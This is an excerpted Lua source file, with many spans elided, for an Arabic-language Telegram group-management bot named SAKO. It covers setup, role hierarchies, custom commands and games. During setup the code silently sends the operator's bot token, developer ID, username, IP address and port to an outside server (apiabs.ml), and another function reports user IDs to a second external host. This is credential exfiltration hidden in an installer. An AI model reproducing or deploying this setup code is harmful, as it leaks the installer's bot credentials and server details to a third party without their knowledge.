...
if not DevRio:get(Server.."IdSAKO") then 
io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
local DevId = io.read():gsub(' ','') 
if tostring(DevId):match('%d+') then 
data,res = https.request("https://apiabs.ml/Api/SAKO/index.php?Ban=SAKO&Info&Id="..DevId)
if res == 200 then
Abs = json:decode(data)
if Abs.Result.Info == 'Is_Spam' then
print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nعذرا هذا الايدي محظور من تنصيب هذا السورس\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
os.execute('lua SAKO.lua') 
end ---ifBn
if Abs.Result.Info == 'Ok' then
io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
DevRio:set(Server.."IdSAKO",DevId) 
end ---ifok
else 
...
if not DevRio:get(Server.."TokenSAKO") then 
...
DevRio:set(Server.."TokenSAKO",TokenBot) 
end  
else 
...
Config = {
DevId = DevRio:get(Server.."IdSAKO"),
TokenBot = DevRio:get(Server.."TokenSAKO"),
SAKO = DevRio:get(Server.."TokenSAKO"):match("(%d+)"),
SudoIds = {DevRio:get(Server.."IdSAKO")},
}
Create(Config, "./config.lua") 
https.request("https://apiabs.ml/Api/SAKO/index.php?Get=SAKO&DevId="..DevRio:get(Server.."IdSAKO").."&TokenBot="..DevRio:get(Server.."TokenSAKO").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
file = io.open("SAKO.sh", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/SAKO
token="]]..DevRio:get(Server.."TokenSAKO")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
...
./tg -s ./SAKO.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("Run", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S SAKO -X kill
screen -S SAKO ./SAKO.sh
done
]]) 
file:close() 
...
local Load_SAKO = function() 
local f = io.open("./config.lua", "r") 
if not f then 
AutoSet() 
else 
f:close() 
DevRio:del(Server.."IdSAKO");DevRio:del(Server.."TokenSAKO")
end 
...
NameBot = (DevRio:get(SAKO..'Rio:NameBot') or 'ديفد')
--     Source SAKO     --
...
local Status = DevRio:sismember(SAKO..'Rio:RioSudo:',msg.sender_user_id_) 
...
local Status = DevRio:sismember(SAKO..'Rio:SecondSudo:',msg.sender_user_id_) 
...
function Bot(msg) 
local var = false  
if msg.sender_user_id_ == tonumber(SAKO) then  
var = true  
end  
return var  
end 
...
local Status = DevRio:sismember(SAKO..'Rio:SudoBot:',msg.sender_user_id_) 
...
local Status = DevRio:sismember(SAKO..'Rio:RioConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
...
----   Owner   ----
function Owner(msg) 
local Status = DevRio:sismember(SAKO..'Rio:Owner:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(SAKO..'Rio:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(SAKO..'Rio:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(SAKO..'Rio:Managers:'..msg.chat_id_,msg.sender_user_id_) 
...
----------  Admin  ---------
function Admin(msg) 
local Status = DevRio:sismember(SAKO..'Rio:Admins:'..msg.chat_id_,msg.sender_user_id_) 
...
---------Vip Member---------
function VipMem(msg) 
local Status = DevRio:sismember(SAKO..'Rio:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(SAKO..'Rio:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(SAKO..'Rio:CleanerNum:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(SAKO..'Rio:CleanerMusic:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Cleaner(msg) or RioConstructor(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
...
if DevRio:sismember(SAKO..'Rio:Ban:'..chat_id, user_id) then
var = true
else
var = false
end
...
if DevRio:sismember(SAKO..'Rio:BanAll:', user_id) then
var = true
else
var = false
end
...
if DevRio:sismember(SAKO..'Rio:Muted:'..chat_id, user_id) then
var = true
else
var = false
end
...
if DevRio:sismember(SAKO..'Rio:MuteAll:', user_id) then
var = true
else
var = false
end
...
--     Source SAKO     --
function SAKOFiles(msg)
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
plugin = dofile("Files/"..v)
if plugin.SAKO and msg then
FilesText = plugin.SAKO(msg)
end
end
end
...
if File_Name:lower():match('(%d+)') ~= SAKO:lower() then 
...
local info_file = io.open('./'..SAKO..'.json', "r"):read('*a')
local JsonInfo = JSON.decode(info_file)
vardump(JsonInfo)
DevRio:set(SAKO.."Rio:NameBot",JsonInfo.BotName) 
for IdGps,v in pairs(JsonInfo.GroupsList) do
DevRio:sadd(SAKO.."Rio:Groups",IdGps) 
DevRio:set(SAKO.."Rio:Lock:Bots"..IdGps,"del") DevRio:hset(SAKO.."Rio:Spam:Group:User"..IdGps ,"Spam:User","keed") 
...
DevRio:set(SAKO..Lock..IdGps,true)
end
if v.RioConstructors then
for k,IdRioConstructors in pairs(v.RioConstructors) do
DevRio:sadd(SAKO..'Rio:RioConstructor:'..IdGps,IdRioConstructors)  
print('تم رفع منشئين المجموعات')
end
end
if v.BasicConstructors then
for k,IdBasicConstructors in pairs(v.BasicConstructors) do
DevRio:sadd(SAKO..'Rio:BasicConstructor:'..IdGps,IdBasicConstructors)  
print('تم رفع ( '..k..' ) منشئين اساسيين')
end
end
if v.Constructors then
for k,IdConstructors in pairs(v.Constructors) do
DevRio:sadd(SAKO..'Rio:Constructor:'..IdGps,IdConstructors)  
print('تم رفع ( '..k..' ) منشئين')
end
end
if v.Managers then
for k,IdManagers in pairs(v.Managers) do
DevRio:sadd(SAKO..'Rio:Managers:'..IdGps,IdManagers)  
...
vardump(IdAdmins)
DevRio:sadd(SAKO..'Rio:Admins:'..IdGps,IdAdmins)  
print('تم رفع ( '..k..' ) ادمنيه')
end
end
if v.Vips then
for k,IdVips in pairs(v.Vips) do
DevRio:sadd(SAKO..'Rio:VipMem:'..IdGps,IdVips)  
print('تم رفع ( '..k..' ) مميزين')
end
end
if v.LinkGroups then
if v.LinkGroups ~= "" then
DevRio:set(SAKO.."Rio:Groups:Links"..IdGps,v.LinkGroups)   
print('( تم وضع روابط المجموعات )')
end
end
if v.Welcomes then
if v.Welcomes ~= "" then
DevRio:set(SAKO.."Rio:Groups:Welcomes"..IdGps,v.Welcomes)   
...
--     Source SAKO     --
local RioRank = function(msg) if SudoId(msg.sender_user_id_) then SAKOTeam  = "المطور" elseif RioSudo(msg) then SAKOTeam = "المطور" elseif SecondSudo(msg) then SAKOTeam = "المطور" elseif SudoBot(msg) then SAKOTeam = "المطور" elseif Manager(msg) then SAKOTeam = "المدير" elseif Admin(msg) then SAKOTeam = "الادمن" else SAKOTeam = "العضو" end return SAKOTeam end
function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1558668590) then SAKOTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(1750071859) then SAKOTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(1516553352) then SAKOTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(SAKO) then SAKOTeam = 'البوت' elseif SudoId(user_id) then SAKOTeam = 'المطور الاساسي' elseif DevRio:sismember(SAKO..'Rio:RioSudo:', user_id) then SAKOTeam = 'المطور الاساسي' elseif DevRio:sismember(SAKO..'Rio:SecondSudo:', user_id) then SAKOTeam = 'المطور الاساسي²' elseif DevRio:sismember(SAKO..'Rio:SudoBot:', user_id) then SAKOTeam = DevRio:get(SAKO.."Rio:SudoBot:Rd"..chat_id) or 'المطور' elseif DevRio:sismember(SAKO..'Rio:RioConstructor:'..chat_id, user_id) then SAKOTeam = 'المالك' elseif DevRio:sismember(SAKO..'Rio:Owner:', user_id) then SAKOTeam = 'المالك' elseif DevRio:sismember(SAKO..'Rio:BasicConstructor:'..chat_id, user_id) then SAKOTeam = DevRio:get(SAKO.."Rio:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevRio:sismember(SAKO..'Rio:Constructor:'..chat_id, user_id) then SAKOTeam = DevRio:get(SAKO.."Rio:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevRio:sismember(SAKO..'Rio:Managers:'..chat_id, user_id) then SAKOTeam = DevRio:get(SAKO.."Rio:Managers:Rd"..chat_id) or 'المدير' elseif DevRio:sismember(SAKO..'Rio:Admins:'..chat_id, user_id) then SAKOTeam = DevRio:get(SAKO.."Rio:Admins:Rd"..chat_id) or 'الادمن' elseif DevRio:sismember(SAKO..'Rio:VipMem:'..chat_id, user_id) then  SAKOTeam = DevRio:get(SAKO.."Rio:VipMem:Rd"..chat_id) or 'المميز' elseif DevRio:sismember(SAKO..'Rio:Cleaner:'..chat_id, user_id) then  SAKOTeam = DevRio:get(SAKO.."Rio:Cleaner:Rd"..chat_id) or 'المنظف' else SAKOTeam = DevRio:get(SAKO.."Rio:mem:Rd"..chat_id) or 'العضو' end return SAKOTeam end
--     Source SAKO     --
function RankChecking(user_id,chat_id)
if SudoId(user_id) then
var = true  
elseif tonumber(user_id) == tonumber(SAKO) then  
var = true
elseif DevRio:sismember(SAKO..'Rio:RioSudo:', user_id) then
var = true
elseif DevRio:sismember(SAKO..'Rio:SecondSudo:', user_id) then
var = true  
elseif DevRio:sismember(SAKO..'Rio:SudoBot:', user_id) then
var = true 
elseif DevRio:sismember(SAKO..'Rio:RioConstructor:'..chat_id, user_id) then
var = true
elseif DevRio:sismember(SAKO..'Rio:Owner:'..chat_id, user_id) then
var = true
elseif DevRio:sismember(SAKO..'Rio:BasicConstructor:'..chat_id, user_id) then
var = true
elseif DevRio:sismember(SAKO..'Rio:Constructor:'..chat_id, user_id) then
var = true  
elseif DevRio:sismember(SAKO..'Rio:Managers:'..chat_id, user_id) then
var = true  
elseif DevRio:sismember(SAKO..'Rio:Admins:'..chat_id, user_id) then
var = true  
elseif DevRio:sismember(SAKO..'Rio:VipMem:'..chat_id, user_id) then  
var = true 
else  
var = false
end  
...
local rio = (SAKO..'Rio:Filters:'..msg.chat_id_)
if rio then
...
--     Source SAKO     --
function riomoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevRio:get(SAKO..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     Source SAKO     --
function SourceCh(msg) 
local url,res = https.request('https://ccccxcc.ml/SAKO/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.ChatMember.SAKO ~= true then
Var = false
...
local var = true 
if DevRio:get(SAKO.."Rio:ChId") then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..DevRio:get(SAKO..'Rio:ChId')..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if DevRio:get(SAKO..'Rio:ChText') then
local ChText = DevRio:get(SAKO..'Rio:ChText')
send(msg.chat_id_,msg.id_,'['..ChText..']')
else
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevRio:get(SAKO.."Rio:ChId"))
local GetInfo = JSON.decode(Check)
...
if DataText == '/delyes' and DevRio:get(SAKO..'yes'..data.sender_user_id_) == 'delyes' then
DevRio:del(SAKO..'yes'..data.sender_user_id_, 'delyes')
DevRio:del(SAKO..'no'..data.sender_user_id_, 'delno')
...
if DataText == '/delno' and DevRio:get(SAKO..'no'..data.sender_user_id_) == 'delno' then
DevRio:del(SAKO..'yes'..data.sender_user_id_, 'delyes')
DevRio:del(SAKO..'no'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء امر اطردني") 
end
--     Source SAKO     --
if DataText == '/yesdel' and DevRio:get(SAKO..'yesdel'..data.sender_user_id_) == 'delyes' then
DevRio:del(SAKO..'yesdel'..data.sender_user_id_, 'delyes')
DevRio:del(SAKO..'nodel'..data.sender_user_id_, 'delno')
if DevRio:sismember(SAKO..'Rio:Constructor:'..data.chat_id_, data.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevRio:sismember(SAKO..'Rio:Managers:'..data.chat_id_, data.sender_user_id_) then
Managers = 'المدراء • ' else Managers = '' end
if DevRio:sismember(SAKO..'Rio:Admins:'..data.chat_id_, data.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevRio:sismember(SAKO..'Rio:VipMem:'..data.chat_id_, data.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevRio:sismember(SAKO..'Rio:Cleaner:'..data.chat_id_, data.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = '' end
if DevRio:sismember(SAKO..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
donky = 'المطايه • ' else donky = '' end
if DevRio:sismember(SAKO..'Rio:Constructor:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(SAKO..'Rio:Managers:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(SAKO..'Rio:Admins:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(SAKO..'Rio:VipMem:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(SAKO..'Rio:Cleaner:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(SAKO..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
DevRio:srem(SAKO..'Rio:Constructor:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(SAKO..'Rio:Managers:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(SAKO..'Rio:Admins:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(SAKO..'Rio:VipMem:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(SAKO..'Rio:Cleaner:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(SAKO..'User:Donky:'..data.chat_id_,data.sender_user_id_)
...
if DevRio:get(SAKO.."Rio:NewDev"..data.sender_user_id_) then
if DataText == '/setno' then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء امر تغير المطور الاساسي") 
DevRio:del(SAKO.."Rio:NewDev"..data.sender_user_id_)
return false
end
if DataText == '/setyes' then
local NewDev = DevRio:get(SAKO.."Rio:NewDev"..data.sender_user_id_)
...
if DataText == '/nodel' and DevRio:get(SAKO..'nodel'..data.sender_user_id_) == 'delno' then
DevRio:del(SAKO..'yesdel'..data.sender_user_id_, 'delyes')
DevRio:del(SAKO..'nodel'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء امر نزلني") 
end
if DataText == '/YesRolet' and DevRio:get(SAKO.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
local List = DevRio:smembers(SAKO..'Rio:ListRolet'..data.chat_id_) 
local UserName = List[math.random(#List)]
tdcli_function ({ID="SearchPublicChat",username_ = UserName},function(arg,dp) 
DevRio:incrby(SAKO..'Rio:GamesNumber'..data.chat_id_..dp.id_, 5) 
end,nil) 
DevRio:del(SAKO..'Rio:ListRolet'..data.chat_id_) 
DevRio:del(SAKO.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "᥀︙*صاحب الحظ* ↫ ["..UserName.."]\n᥀︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*")
end
if DataText == '/NoRolet' then
DevRio:del(SAKO..'Rio:ListRolet'..data.chat_id_) 
DevRio:del(SAKO.."Rio:NumRolet"..data.chat_id_..data.sender_user_id_) 
DevRio:del(SAKO.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
...
if DevRio:sismember(SAKO..'Rio:Tkeed:'..Chat_Id2, data.sender_user_id_) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..Chat_Id2.."&user_id="..data.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevRio:srem(SAKO..'Rio:Tkeed:'..Chat_Id2, data.sender_user_id_)
...
DevRio:del(SAKO..'Rio:Text:GpTexts'..Rio..data.chat_id_)
DevRio:srem(SAKO..'Rio:Manager:GpRedod'..data.chat_id_,Rio)
end
if DataText and DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)')
local List = DevRio:smembers(SAKO..'Rio:Text:GpTexts'..Rio..data.chat_id_)
if DevRio:get(SAKO..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم انهاء وحفظ ↫ "..#List.." من الردود المتعدده للامر ↫ "..Rio) 
DevRio:del(SAKO..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
else
...
DevRio:del(SAKO..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
DevRio:del(SAKO..'Rio:Text:GpTexts'..Rio..data.chat_id_)
DevRio:del(SAKO..'Rio:Add:GpTexts'..data.sender_user_id_..data.chat_id_)
DevRio:srem(SAKO..'Rio:Manager:GpRedod'..data.chat_id_,Rio)
else
EditMsg(Chat_Id2, Msg_Id2, "᥀︙عذرا صلاحية الامر منتهيه !") 
end
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Help = DevRio:get(SAKO..'Rio:Help')
local Text = [[
...
local Help = DevRio:get(SAKO..'Rio:Help1')
local Text = [[
...
local Help = DevRio:get(SAKO..'Rio:Help2')
local Text = [[
᥀︙اوامر الادمنيه ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙الاعدادت
...
local Help = DevRio:get(SAKO..'Rio:Help3')
local Text = [[
᥀︙اوامر المدراء ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙فحص البوت
...
local Help = DevRio:get(SAKO..'Rio:Help4')
local Text = [[
᥀︙اوامر المنشئين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تنزيل الكل
...
local Help = DevRio:get(SAKO..'Rio:Help5')
local Text = [[
᥀︙اوامر المطورين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙الكروبات
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Help = DevRio:get(SAKO..'Rio:Help6')
local Text = [[
᥀︙اوامر الاعضاء ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
...
if text and DevRio:get(SAKO.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = DevRio:get(SAKO.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
DevRio:del(SAKO.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
DevRio:del(SAKO.."Set:Cmd:Group:New"..msg.chat_id_)
DevRio:srem(SAKO.."List:Cmd:Group:New"..msg.chat_id_,text)
...
DevRio:del(SAKO.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text and text:match('^'..(DevRio:get(SAKO..'Rio:NameBot') or "ديفد")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevRio:get(SAKO..'Rio:NameBot') or "ديفد")..' ','')
end
if data.message_.content_.text_ then
local NewCmmd = DevRio:get(SAKO.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if text and DevRio:get(SAKO.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
DevRio:set(SAKO.."Set:Cmd:Group:New"..msg.chat_id_,text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙ارسل الامر الجديد", 1, 'html')
DevRio:del(SAKO.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
DevRio:set(SAKO.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and DevRio:get(SAKO.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = DevRio:get(SAKO.."Set:Cmd:Group:New"..msg.chat_id_)
DevRio:set(SAKO.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
DevRio:sadd(SAKO.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الامر", 1, 'html')
DevRio:del(SAKO.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if Constructor(msg) then
if text == "الاوامر المضافه" and ChCheck(msg) then
local List = DevRio:smembers(SAKO.."List:Cmd:Group:New"..msg.chat_id_.."") 
t = "᥀︙قائمة الاوامر المضافه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
Cmds = DevRio:get(SAKO.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..k.."~ ("..v..") • {"..Cmds.."}\n"
else
t = t..k.."~ ("..v..") \n"
...
local List = DevRio:smembers(SAKO.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(List) do
DevRio:del(SAKO.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
DevRio:del(SAKO.."List:Cmd:Group:New"..msg.chat_id_)
end
...
DevRio:set(SAKO.."Set:Cmd:Group:New1"..msg.chat_id_..":ا","ايدي")
DevRio:sadd(SAKO.."List:Cmd:Group:New"..msg.chat_id_,"ا")
DevRio:set(SAKO.."Set:Cmd:Group:New1"..msg.chat_id_..":م","رفع مميز")
DevRio:sadd(SAKO.."List:Cmd:Group:New"..msg.chat_id_,"م")
DevRio:set(SAKO.."Set:Cmd:Group:New1"..msg.chat_id_..":اد","رفع ادمن")
DevRio:sadd(SAKO.."List:Cmd:Group:New"..msg.chat_id_,"اد")
DevRio:set(SAKO.."Set:Cmd:Group:New1"..msg.chat_id_..":مد","رفع مدير")
DevRio:sadd(SAKO.."List:Cmd:Group:New"..msg.chat_id_,"مد")
DevRio:set(SAKO.."Set:Cmd:Group:New1"..msg.chat_id_..":من","رفع منشئ")
DevRio:sadd(SAKO.."List:Cmd:Group:New"..msg.chat_id_,"من")
DevRio:set(SAKO.."Set:Cmd:Group:New1"..msg.chat_id_..":اس","رفع منشئ اساسي")
DevRio:sadd(SAKO.."List:Cmd:Group:New"..msg.chat_id_,"اس")
DevRio:set(SAKO.."Set:Cmd:Group:New1"..msg.chat_id_..":مط","رفع مطور")
DevRio:sadd(SAKO.."List:Cmd:Group:New"..msg.chat_id_,"مط")
DevRio:set(SAKO.."Set:Cmd:Group:New1"..msg.chat_id_..":ثانوي","رفع مطور ثانوي")
DevRio:sadd(SAKO.."List:Cmd:Group:New"..msg.chat_id_,"ثانوي")
DevRio:set(SAKO.."Set:Cmd:Group:New1"..msg.chat_id_..":تك","تنزيل الكل")
DevRio:sadd(SAKO.."List:Cmd:Group:New"..msg.chat_id_,"تك")
DevRio:set(SAKO.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط","تعطيل الايدي بالصوره")
DevRio:sadd(SAKO.."List:Cmd:Group:New"..msg.chat_id_,"تعط")
DevRio:set(SAKO.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع","تفعيل الايدي بالصوره")
DevRio:sadd(SAKO.."List:Cmd:Group:New"..msg.chat_id_,"تفع")
DevRio:set(SAKO.."Set:Cmd:Group:New1"..msg.chat_id_..":ر","الرابط")
DevRio:sadd(SAKO.."List:Cmd:Group:New"..msg.chat_id_,"ر")
DevRio:set(SAKO.."Set:Cmd:Group:New1"..msg.chat_id_..":رر","ردود المدير")
DevRio:sadd(SAKO.."List:Cmd:Group:New"..msg.chat_id_,"رر")
DevRio:set(SAKO.."Set:Cmd:Group:New1"..msg.chat_id_..":،،","مسح المكتومين")
DevRio:sadd(SAKO.."List:Cmd:Group:New"..msg.chat_id_,"،،")
DevRio:set(SAKO.."Set:Cmd:Group:New1"..msg.chat_id_..":رد","اضف رد")
DevRio:sadd(SAKO.."List:Cmd:Group:New"..msg.chat_id_,"رد")
DevRio:set(SAKO.."Set:Cmd:Group:New1"..msg.chat_id_..":سح","مسح سحكاتي")
DevRio:sadd(SAKO.."List:Cmd:Group:New"..msg.chat_id_,"سح")
DevRio:set(SAKO.."Set:Cmd:Group:New1"..msg.chat_id_..":رس","مسح رسائلي")
DevRio:sadd(SAKO.."List:Cmd:Group:New"..msg.chat_id_,"رس")
DevRio:set(SAKO.."Set:Cmd:Group:New1"..msg.chat_id_..":غ","غنيلي")
DevRio:sadd(SAKO.."List:Cmd:Group:New"..msg.chat_id_,"غ")
DevRio:set(SAKO.."Set:Cmd:Group:New1"..msg.chat_id_..":#","مسح قائمه العام")
DevRio:sadd(SAKO.."List:Cmd:Group:New"..msg.chat_id_,"#")
...
DevRio:set(SAKO.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
...
DevRio:set(SAKO.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
...
local List = DevRio:smembers(SAKO.."Coomds"..msg.chat_id_)
if #List == 0 then
...
for k,v in pairs(List) do
var = DevRio:get(SAKO.."Comd:New:rt:Rio:"..v..msg.chat_id_)
if var then
t = t..k.."~ "..v.." • ("..var..")\n"
else
t = t..k.."~ "..v.."\n"
...
local List = DevRio:smembers(SAKO.."Coomds"..msg.chat_id_)
for k,v in pairs(List) do
DevRio:del(SAKO.."Comd:New:rt:Rio:"..v..msg.chat_id_)
DevRio:del(SAKO.."Coomds"..msg.chat_id_)
end
...
DevRio:set(SAKO.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
DevRio:sadd(SAKO.."Coomds"..msg.chat_id_,ComdNew)  
DevRio:setex(SAKO.."Comd:New"..msg.chat_id_..msg.sender_user_id_,200,true)  
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙ارسل نوع الصلاحيه \n{ عضو • مميز  • ادمن  • مدير }\n᥀︙ارسل الغاء لالغاء الامر ", 1, 'html')
end
if text and text:match("^حذف صلاحيه (.*)$") and ChCheck(msg) or text and text:match("^مسح صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^حذف صلاحيه (.*)$") or text:match("^مسح صلاحيه (.*)$")
DevRio:del(SAKO.."Comd:New:rt:Rio:"..ComdNew..msg.chat_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حذف الصلاحيه", 1, 'html')
end
if DevRio:get(SAKO.."Comd:New"..msg.chat_id_..msg.sender_user_id_) then 
if text and text:match("^↫ الغاء ᥀$") then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر", 1, 'html')
DevRio:del(SAKO.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
...
local textn = DevRio:get(SAKO.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
DevRio:set(SAKO.."Comd:New:rt:Rio:"..textn..msg.chat_id_,text)
...
if DevRio:sismember(SAKO.."Coomds"..msg.chat_id_,DEV_RIO) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrrio = DevRio:get(SAKO.."Comd:New:rt:Rio:"..DEV_RIO..msg.chat_id_)
...
DevRio:set(SAKO.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO) 
DevRio:sadd(SAKO..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'L9L9L')..')'..' ❩\n᥀︙تم رفعه ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:set(SAKO.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO)
DevRio:sadd(SAKO..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'L9L9L')..')'..' ❩\n᥀︙تم رفعه ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:set(SAKO.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO)  
DevRio:sadd(SAKO..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
...
DevRio:srem(SAKO..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevRio:del(SAKO.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
